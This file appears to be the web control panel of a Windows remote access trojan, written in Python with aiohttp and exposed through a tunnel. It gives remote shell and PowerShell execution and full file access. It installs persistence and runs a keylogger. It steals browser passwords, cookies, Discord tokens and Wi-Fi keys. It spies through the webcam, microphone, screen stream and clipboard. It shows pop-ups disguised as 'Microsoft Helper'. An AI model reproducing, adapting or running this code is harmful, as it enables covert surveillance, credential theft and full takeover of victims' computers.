import asyncio
import io
import json
import pathlib
import re
import shutil
import socket
import time
import zipfile

import psutil
from aiohttp import WSMsgType, web

from core import browser, cam, capture, collect, creds, keylog, tunnel
from core import input as inp
from core.paths import BASE as ROOT
from core.util import CWD, run, run_ps

UI = ROOT / 'webui'
CHUNK = ROOT / 'chunks'

TOKEN = None
LOOP = None
RUNNER = None
SITE = None
TUNNEL = None
LAN = None
ON_URL = None
ON_DOWN = None
VIEWERS = set()
SPY_WS = set()
LAST_HIT = 0.0

MAX_INFLIGHT = 2


# ------------------------------------------------------------------ auth
def auth(req):
    return (req.cookies.get('k') == TOKEN or req.query.get('k') == TOKEN
            or req.headers.get('X-K') == TOKEN)


def guard(fn):
    async def w(req):
        global LAST_HIT
        LAST_HIT = time.time()
        if not auth(req):
            if req.query.get('k') == TOKEN:
                r = web.HTTPFound(req.path)
                r.set_cookie('k', TOKEN, max_age=86400 * 90, httponly=True, samesite='Lax')
                raise r
            raise web.HTTPUnauthorized()
        return await fn(req)
    return w


async def index(req):
    global LAST_HIT
    LAST_HIT = time.time()
    if req.query.get('k') == TOKEN:
        r = web.HTTPFound('/')
        r.set_cookie('k', TOKEN, max_age=86400 * 90, httponly=True, samesite='Lax')
        raise r
    if not auth(req):
        return web.FileResponse(UI / 'login.html')
    return web.FileResponse(UI / 'index.html')


async def health(req):
    return web.json_response({
        'ok': True,
        'url': TUNNEL.url if TUNNEL else None,
        'provider': TUNNEL.provider if TUNNEL else None,
        'lan': LAN,
        'viewers': len(VIEWERS),
        'cam_live': cam.LIVE.on,
    })


# ------------------------------------------------------------------ helpers
def safe(p):
    return pathlib.Path(str(p).replace('/', '\\'))


def join(p, n):
    p = str(p)
    return p if p.endswith('\\') else p + '\\' + str(n)


# ------------------------------------------------------------------ files
@guard
async def fs_list(req):
    p = safe(req.query.get('path', 'C:\\'))
    try:
        items = []
        for i in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower()))[:900]:
            try:
                st = i.stat()
                items.append({'name': i.name, 'dir': i.is_dir(), 'size': st.st_size,
                              'mtime': int(st.st_mtime), 'ext': i.suffix.lower().lstrip('.')})
            except Exception:
                items.append({'name': i.name, 'dir': False, 'size': 0, 'mtime': 0, 'ext': ''})
        drives = []
        for d in psutil.disk_partitions():
            try:
                u = psutil.disk_usage(d.mountpoint)
                drives.append({'path': d.device, 'free': u.free, 'total': u.total})
            except Exception:
                drives.append({'path': d.device, 'free': 0, 'total': 0})
        return web.json_response({'path': str(p), 'parent': str(p.parent),
                                  'items': items, 'drives': drives})
    except Exception as e:
        return web.json_response({'error': str(e)}, status=400)


@guard
async def fs_raw(req):
    p = safe(req.query.get('path'))
    if not p.is_file():
        raise web.HTTPNotFound()
    return web.FileResponse(p, headers={'Content-Disposition': f'attachment; filename="{p.name}"'})


@guard
async def fs_preview(req):
    p = safe(req.query.get('path'))
    if not p.is_file():
        raise web.HTTPNotFound()
    try:
        from PIL import Image
        im = Image.open(p)
        im.thumbnail((1000, 1000))
        b = io.BytesIO()
        im.convert('RGB').save(b, 'JPEG', quality=82)
        return web.Response(body=b.getvalue(), content_type='image/jpeg')
    except Exception:
        return web.FileResponse(p)


@guard
async def fs_zip(req):
    p = safe(req.query.get('path'))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        if p.is_dir():
            for f in p.rglob('*'):
                if f.is_file():
                    try:
                        z.write(f, f.relative_to(p))
                    except Exception:
                        pass
        else:
            z.write(p, p.name)
    return web.Response(body=buf.getvalue(), headers={
        'Content-Type': 'application/zip',
        'Content-Disposition': f'attachment; filename="{p.name}.zip"'})


@guard
async def fs_read(req):
    p = safe(req.query.get('path'))
    if p.stat().st_size > 6_000_000:
        return web.json_response({'error': 'too big for editor'})
    try:
        return web.json_response({'data': p.read_text('utf-8', 'replace')})
    except Exception as e:
        return web.json_response({'error': str(e)}, status=400)


@guard
async def fs_write(req):
    o = await req.json()
    safe(o['path']).write_text(o['data'], 'utf-8')
    return web.json_response({'ok': True})


@guard
async def fs_mkdir(req):
    o = await req.json()
    safe(o['path']).mkdir(parents=True, exist_ok=True)
    return web.json_response({'ok': True})


@guard
async def fs_rename(req):
    o = await req.json()
    safe(o['from']).rename(safe(o['to']))
    return web.json_response({'ok': True})


@guard
async def fs_delete(req):
    o = await req.json()
    for p in o['paths']:
        q = safe(p)
        if q.is_dir():
            shutil.rmtree(q, ignore_errors=True)
        else:
            q.unlink(missing_ok=True)
    return web.json_response({'ok': True})


# ------------------------------------------------------------------ upload
def _chunk_path(uid):
    CHUNK.mkdir(exist_ok=True)
    return CHUNK / uid


@guard
async def up_start(req):
    o = await req.json()
    uid = f'{int(time.time() * 1000)}_{abs(hash(o.get("name", "f")))}'
    _chunk_path(uid).write_bytes(b'')
    return web.json_response({'id': uid})


@guard
async def up_chunk(req):
    body = await req.read()
    with _chunk_path(req.query.get('id')).open('ab') as f:
        f.write(body)
    return web.json_response({'ok': len(body)})


@guard
async def up_finish(req):
    o = await req.json()
    dest, name = safe(o['path']), o['name']
    dest.mkdir(parents=True, exist_ok=True)
    shutil.move(str(_chunk_path(o['id'])), str(dest / pathlib.Path(name).name))
    return web.json_response({'ok': True})


# ------------------------------------------------------------------ system
@guard
async def api_sys(req):
    vm = psutil.virtual_memory()
    procs = []
    for p in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent', 'status', 'username']):
        try:
            i = p.info
            procs.append({'pid': i['pid'], 'name': i['name'],
                          'mem': i['memory_info'].rss if i['memory_info'] else 0,
                          'cpu': i['cpu_percent'] or 0, 'status': i['status'],
                          'user': (i['username'] or '').split('\\')[-1]})
        except Exception:
            pass
    procs.sort(key=lambda x: x['mem'], reverse=True)
    bat = psutil.sensors_battery()
    net = psutil.net_io_counters()
    return web.json_response({
        'cpu': psutil.cpu_percent(interval=None),
        'ram': vm.percent, 'ram_used': vm.used, 'ram_total': vm.total,
        'disk': psutil.disk_usage('C:\\').percent,
        'net': {'sent': net.bytes_sent, 'recv': net.bytes_recv},
        'boot': psutil.boot_time(), 'procs': procs[:120],
        'battery': (bat._asdict() if bat else None),
        'uptime': time.time() - psutil.boot_time(),
    })


@guard
async def api_proc(req):
    o = await req.json()
    p = psutil.Process(int(o['pid']))
    a = o.get('action', 'kill')
    if a == 'kill':
        p.kill()
    elif a == 'terminate':
        p.terminate()
    elif a == 'suspend':
        p.suspend()
    elif a == 'resume':
        p.resume()
    return web.json_response({'ok': True})


# ------------------------------------------------------------------ actions
def _action(name, args):
    from core import persist

    if name == 'cmd':
        return run(args.get('cmd', ''), CWD['path'], 180)
    if name == 'ps':
        return run_ps(args.get('cmd', ''), 120)
    if name == 'cd':
        p = pathlib.Path(args.get('path', CWD['path']))
        if p.is_dir():
            CWD['path'] = str(p)
        return CWD['path']
    if name == 'cwd':
        return CWD['path']
    if name == 'services':
        return run_ps('Get-Service|Where Status -eq Running|Select -First 80 Name,DisplayName'
                      '|ft -AutoSize|Out-String -Width 200')
    if name == 'startup':
        return run_ps('Get-CimInstance Win32_StartupCommand|Select Name,Command,Location'
                      '|fl|Out-String -Width 300')
    if name == 'scheduled':
        return run_ps('Get-ScheduledTask|Where State -ne Disabled|Select TaskName,State'
                      '|ft -AutoSize|Out-String -Width 200')
    if name == 'users':
        return run_ps('Get-LocalUser|Select Name,Enabled,LastLogon|ft -AutoSize|Out-String')
    if name == 'admins':
        return run('net localgroup administrators')
    if name == 'installed':
        return run_ps('Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,'
                      'HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'
                      '|Where DisplayName|Select DisplayName,DisplayVersion|ft -AutoSize|Out-String -Width 200')
    if name == 'patches':
        return run_ps('Get-HotFix|Select HotFixID,InstalledOn|ft -AutoSize|Out-String')
    if name == 'env':
        return '\n'.join(f'{k}={v}' for k, v in sorted(__import__('os').environ.items()))
    if name == 'hosts':
        return pathlib.Path(r'C:\Windows\System32\drivers\etc\hosts').read_text(errors='replace')
    if name == 'clip':
        return run_ps('Get-Clipboard -Raw')
    if name == 'clipset':
        run_ps(f'Set-Clipboard -Value "{args.get("text","")}"')
        return 'set'
    if name == 'msg':
        run_ps('Add-Type -AssemblyName PresentationFramework;'
               f'[System.Windows.MessageBox]::Show("{args.get("text","")}","Microsoft Helper")'
               '|Out-Null')
        return 'shown'
    if name == 'toast':
        run_ps('Add-Type -AssemblyName System.Windows.Forms;'
               '$n=New-Object System.Windows.Forms.NotifyIcon;'
               '$n.Icon=[System.Drawing.SystemIcons]::Information;$n.Visible=$true;'
               f'$n.ShowBalloonTip(5000,"Microsoft Helper","{args.get("text","")}",0)')
        return 'sent'
    if name == 'speak':
        run_ps('Add-Type -AssemblyName System.Speech;'
               f'(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{args.get("text","")}")')
        return 'spoken'
    if name == 'open':
        run(f'start "" "{args.get("target","")}"')
        return 'opened'
    if name == 'lock':
        run('rundll32.exe user32.dll,LockWorkStation')
        return 'locked'
    if name == 'sleep':
        run('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
        return 'sleeping'
    if name == 'logoff':
        run('shutdown /l')
        return 'logged off'
    if name == 'shutdown':
        run('shutdown /s /t 5')
        return 'bye'
    if name == 'restart':
        run('shutdown /r /t 5')
        return 'rebooting'
    if name == 'monoff':
        run_ps('Add-Type -MemberDefinition \'[DllImport("user32.dll")]public static extern int '
               'SendMessage(int h,int m,int w,int l);\' -Name S -Namespace W;'
               '[W.S]::SendMessage(0xFFFF,0x0112,0xF170,2)')
        return 'off'
    if name == 'wallpaper':
        p = args.get('path', '')
        run_ps(f'Set-ItemProperty "HKCU:\\Control Panel\\Desktop" Wallpaper "{p}";'
               'Add-Type -MemberDefinition \'[DllImport("user32.dll")]public static extern int '
               'SystemParametersInfo(int a,int b,string c,int d);\' -Name S -Namespace W;'
               f'[W.S]::SystemParametersInfo(20,0,"{p}",3)')
        return 'set'
    if name == 'volume':
        from ctypes import POINTER, cast

        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        d = AudioUtilities.GetSpeakers()
        v = (d.EndpointVolume if hasattr(d, 'EndpointVolume')
             else cast(d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None),
                       POINTER(IAudioEndpointVolume)))
        if args.get('mute'):
            v.SetMute(not v.GetMute(), None)
            return 'toggled'
        v.SetMasterVolumeLevelScalar(max(0, min(100, int(args.get('level', 50)))) / 100, None)
        return f'{args.get("level")}%'
    if name == 'persist':
        return persist.install()
    if name == 'unpersist':
        persist.uninstall()
        return 'removed'
    if name == 'status':
        return json.dumps(persist.status(), indent=2)
    if name == 'keys_clear':
        keylog.clear()
        return 'cleared'
    if name == 'keys_start':
        return 'on' if keylog.start() else 'already on'
    if name == 'keys_stop':
        keylog.stop()
        return 'off'
    if name == 'passwords':
        return browser.passwords()
    if name == 'cookies':
        return browser.cookies()
    if name == 'history':
        return browser.history()
    if name == 'dtoken':
        out = []
        for lvl in ('Local Storage', 'leveldb'):
            d = pathlib.Path(__import__('os').getenv('APPDATA', '.')) / 'discord' / lvl
            if not d.exists():
                continue
            for f in list(d.glob('*.ldb')) + list(d.glob('*.log')):
                try:
                    for m in re.finditer(rb'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)', f.read_bytes()):
                        out.append(m.group(1).decode())
                except Exception:
                    pass
        return '\n'.join(dict.fromkeys(out)) or 'none'
    if name == 'wifi':
        return '\n'.join(f"{w['ssid']} : {w['key'] or '(open)'} [{w['auth']}]"
                         for w in creds.wifi()) or 'none'
    if name == 'net':
        return json.dumps(creds.net_summary())
    if name == 'geo':
        import requests
        r = requests.get('http://ip-api.com/json', timeout=6).json()
        return '\n'.join(f'{k}: {v}' for k, v in r.items())
    if name == 'info':
        a, d, p = collect.gather()
        return json.dumps({'fields': a, 'disks': d, 'procs': p})
    if name == 'tree':
        return run(f'tree /F /A "{args.get("path",".")}"', None, 60)
    if name == 'search':
        return run(f'where /r "{args.get("root", "%USERPROFILE%")}" '
                   f'*{args.get("pattern","")}* 2>nul', None, 120)
    if name == 'hash':
        import hashlib
        return hashlib.sha256(pathlib.Path(args['path']).read_bytes()).hexdigest()
    if name == 'ping':
        return run(f'ping -n 4 {args.get("host","8.8.8.8")}')
    raise ValueError(f'unknown action {name}')


@guard
async def api_act(req):
    o = await req.json()
    try:
        out = await asyncio.to_thread(_action, o['action'], o.get('args') or {})
        return web.json_response({'out': out if isinstance(out, str) else str(out)})
    except Exception as e:
        return web.json_response({'error': str(e)}, status=400)


@guard
async def api_portscan(req):
    o = await req.json()
    host, a, b = o['host'], int(o.get('start', 1)), int(o.get('end', 1024))
    found = []

    async def chk(p):
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(host, p), 0.6)
            w.close()
            found.append(p)
        except Exception:
            pass

    for i in range(a, b + 1, 200):
        await asyncio.gather(*[chk(p) for p in range(i, min(i + 200, b + 1))])
    return web.json_response({'open': sorted(found)})


# ------------------------------------------------------------------ camera
@guard
async def api_cams(req):
    force = req.query.get('force') == '1'
    return web.json_response({'cams': await asyncio.to_thread(cam.list_devices, force)})


@guard
async def api_cam(req):
    try:
        b = await asyncio.to_thread(cam.grab, int(req.query.get('i', 0)),
                                    int(req.query.get('q', 80)))
        return web.Response(body=b, content_type='image/jpeg',
                            headers={'Cache-Control': 'no-store'})
    except Exception as e:
        return web.json_response({'error': str(e)}, status=500)


@guard
async def api_cam_live(req):
    o = await req.json()
    if o.get('on'):
        await asyncio.to_thread(cam.LIVE.start, int(o.get('idx', 0)))
        return web.json_response({'on': True})
    await asyncio.to_thread(cam.LIVE.stop)
    return web.json_response({'on': False})


@guard
async def api_cam_shot(req):
    b = cam.LIVE.latest()
    if not b:
        return web.json_response({'error': 'not live'}, status=404)
    return web.Response(body=b, content_type='image/jpeg',
                        headers={'Cache-Control': 'no-store'})


@guard
async def api_cam_release(req):
    await asyncio.to_thread(cam.LIVE.stop)
    return web.json_response({'released': True})


@guard
async def api_monitors(req):
    return web.json_response(capture.monitors())


@guard
async def api_mic(req):
    try:
        import sounddevice as sd
        import soundfile as sf
        rec = await asyncio.to_thread(sd.rec, int(req.query.get('s', 6)) * 16000,
                                      samplerate=16000, channels=1)
        buf = io.BytesIO()
        sf.write(buf, rec, 16000, format='WAV')
        return web.Response(body=buf.getvalue(), content_type='audio/wav')
    except Exception as e:
        return web.json_response({'error': str(e)}, status=500)


# ------------------------------------------------------------------ websockets
class Viewer:
    __slots__ = ('ws', 'pending', 'paused', 'closed')

    def __init__(self, ws):
        self.ws = ws
        self.pending = 0
        self.paused = False
        self.closed = False


def _dec(v):
    v.pending = max(0, v.pending - 1)


def _fanout(x, y, w, h, jpg, fw, fh, kf):
    if not VIEWERS:
        return False
    hdr = bytearray([1])
    for v in (x, y, w, h, fw, fh):
        hdr += int(v).to_bytes(2, 'big')
    hdr += len(jpg).to_bytes(4, 'big')
    hdr += b'\x01' if kf else b'\x00'
    payload = bytes(hdr) + jpg

    ok, sent = True, 0
    for v in list(VIEWERS):
        if v.closed or v.ws.closed or v.paused:
            continue
        if v.pending >= MAX_INFLIGHT:
            ok = False
            continue
        v.pending += 1
        sent += 1
        try:
            fut = asyncio.run_coroutine_threadsafe(v.ws.send_bytes(payload), LOOP)
            fut.add_done_callback(lambda f, vv=v: _dec(vv))
        except Exception:
            v.pending = max(0, v.pending - 1)
            ok = False
    return ok if sent else False


def _sync_pause():
    capture.STREAM.paused = bool(VIEWERS) and all(v.paused for v in VIEWERS)


async def ws_screen(req):
    if not auth(req):
        raise web.HTTPUnauthorized()
    ws = web.WebSocketResponse(max_msg_size=0, heartbeat=25)
    await ws.prepare(req)
    v = Viewer(ws)
    VIEWERS.add(v)
    capture.STREAM.out = _fanout
    capture.STREAM.paused = False
    capture.STREAM.start()
    try:
        async for msg in ws:
            if msg.type != WSMsgType.TEXT:
                continue
            try:
                o = json.loads(msg.data)
            except Exception:
                continue
            t = o.get('t')
            if t == 'move':
                inp.move(o['x'], o['y'])
            elif t == 'click':
                inp.click(o['x'], o['y'], o.get('b', 'left'))
            elif t == 'double':
                inp.dclick(o['x'], o['y'])
            elif t == 'wheel':
                inp.scroll(o['d'])
            elif t == 'key':
                inp.key(o['k'])
            elif t == 'hotkey':
                inp.hotkey(*o['k'])
            elif t == 'type':
                inp.type_text(o['s'])
            elif t == 'q':
                capture.STREAM.q = max(15, min(95, int(o['v'])))
            elif t == 'fps':
                capture.STREAM.fps = max(1, min(60, int(o['v'])))
            elif t == 'scale':
                capture.STREAM.scale = max(0.2, min(1.0, float(o['v'])))
            elif t == 'mon':
                capture.STREAM.mon = int(o['v'])
                capture.STREAM.prev = None
            elif t == 'pause':
                v.paused = bool(o.get('v'))
                _sync_pause()
    finally:
        v.closed = True
        VIEWERS.discard(v)
        if not VIEWERS:
            capture.STREAM.stop()
        else:
            _sync_pause()
    return ws


async def ws_spy(req):
    if not auth(req):
        raise web.HTTPUnauthorized()
    ws = web.WebSocketResponse(heartbeat=25)
    await ws.prepare(req)
    SPY_WS.add(ws)
    try:
        async for _ in ws:
            pass
    finally:
        SPY_WS.discard(ws)
    return ws


async def spy_pump():
    while True:
        if SPY_WS:
            try:
                clip = await asyncio.to_thread(run_ps, 'Get-Clipboard -Raw')
                active = await asyncio.to_thread(run_ps,
                    'Add-Type -MemberDefinition \'[DllImport("user32.dll")]public static extern IntPtr '
                    'GetForegroundWindow();[DllImport("user32.dll")]public static extern int GetWindowText('
                    'IntPtr h,System.Text.StringBuilder s,int c);\' -Name W -Namespace U;'
                    '$s=New-Object Text.StringBuilder 512;'
                    '[U.W]::GetWindowText([U.W]::GetForegroundWindow(),$s,512);$s.ToString()')
                idle = await asyncio.to_thread(run_ps,
                    'Add-Type -AssemblyName System.Windows.Forms;'
                    '[math]::Round([System.Windows.Forms.SystemInformation]::IdleTime.TotalSeconds)')
                payload = json.dumps({'clip': clip[:4000], 'active': active.strip()[:300],
                                      'keys': keylog.read(6000), 'idle': idle.strip(),
                                      'cam_live': cam.LIVE.on})
                for ws in list(SPY_WS):
                    if ws.closed:
                        SPY_WS.discard(ws)
                    else:
                        await ws.send_str(payload)
            except Exception:
                pass
        await asyncio.sleep(1.2)


async def idle_watch(seconds):
    while True:
        await asyncio.sleep(60)
        if not RUNNER:
            return
        if VIEWERS or SPY_WS:
            continue
        if time.time() - LAST_HIT > seconds:
            await stop()
            return


# ------------------------------------------------------------------ lan
def _lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '127.0.0.1'


# ------------------------------------------------------------------ app
def _routes(app):
    app.router.add_get('/', index)
    app.router.add_get('/health', health)
    app.router.add_get('/ws', ws_screen)
    app.router.add_get('/spy', ws_spy)

    for p, f in [('/api/fs', fs_list), ('/api/fs/raw', fs_raw), ('/api/fs/zip', fs_zip),
                 ('/api/fs/read', fs_read), ('/api/fs/preview', fs_preview),
                 ('/api/sys', api_sys), ('/api/monitors', api_monitors),
                 ('/api/cams', api_cams), ('/api/cam', api_cam),
                 ('/api/cam/shot', api_cam_shot), ('/api/mic', api_mic)]:
        app.router.add_get(p, f)

    for p, f in [('/api/fs/write', fs_write), ('/api/fs/mkdir', fs_mkdir),
                 ('/api/fs/rename', fs_rename), ('/api/fs/delete', fs_delete),
                 ('/api/upload/start', up_start), ('/api/upload/chunk', up_chunk),
                 ('/api/upload/finish', up_finish), ('/api/proc', api_proc),
                 ('/api/act', api_act), ('/api/portscan', api_portscan),
                 ('/api/cam/live', api_cam_live), ('/api/cam/release', api_cam_release)]:
        app.router.add_post(p, f)

    app.router.add_static('/s', UI, show_index=False)


def build_app(token):
    global TOKEN
    TOKEN = token
    app = web.Application(client_max_size=200 * 1024 * 1024)
    _routes(app)
    return app


async def start(port, token, cfg, on_url=None, on_down=None):
    global RUNNER, LOOP, TUNNEL, ON_URL, ON_DOWN, LAN, LAST_HIT

    if RUNNER:
        return current_url()

    ON_URL, ON_DOWN = on_url, on_down
    LOOP = asyncio.get_running_loop()
    LAN = _lan_ip()
    LAST_HIT = time.time()

    RUNNER = web.AppRunner(build_app(token), access_log=None)
    await RUNNER.setup()
    await web.TCPSite(RUNNER, '0.0.0.0', port).start()
    asyncio.create_task(spy_pump())

    provider = cfg.get('tunnel', 'auto')
    order = None if provider in (None, '', 'auto') else [provider]

    def fire(fn):
        if not fn:
            return None
        return lambda *a: asyncio.create_task(fn(*a)) if asyncio.iscoroutinefunction(fn) \
            else fn(*a)

    TUNNEL = tunnel.Tunnel(port, token,
                           on_url=lambda u, prov: _cb(on_url, u, prov),
                           on_down=lambda r: _cb(on_down, r),
                           order=order)
    await TUNNEL.start()

    if cfg.get('web_idle_stop', 0) > 0:
        asyncio.create_task(idle_watch(cfg['web_idle_stop']))

    return current_url()


def _cb(fn, *a):
    if not fn:
        return
    try:
        r = fn(*a)
        if asyncio.iscoroutine(r):
            asyncio.create_task(r)
    except Exception:
        pass


def current_url():
    if TUNNEL and TUNNEL.url:
        return f'{TUNNEL.url}/?k={TOKEN}'
    if LAN:
        return f'http://{LAN}:8787/?k={TOKEN}'
    return None


async def stop():
    global RUNNER, TUNNEL, LAST_HIT
    capture.STREAM.stop()
    cam.LIVE.stop()
    if TUNNEL:
        await TUNNEL.stop()
        TUNNEL = None
    if RUNNER:
        await RUNNER.cleanup()
        RUNNER = None
    LAST_HIT = 0


def running():
    return RUNNER is not None


def lan_url():
    return f'http://{LAN}/' if LAN else None


def provider():
    return TUNNEL.provider if TUNNEL else None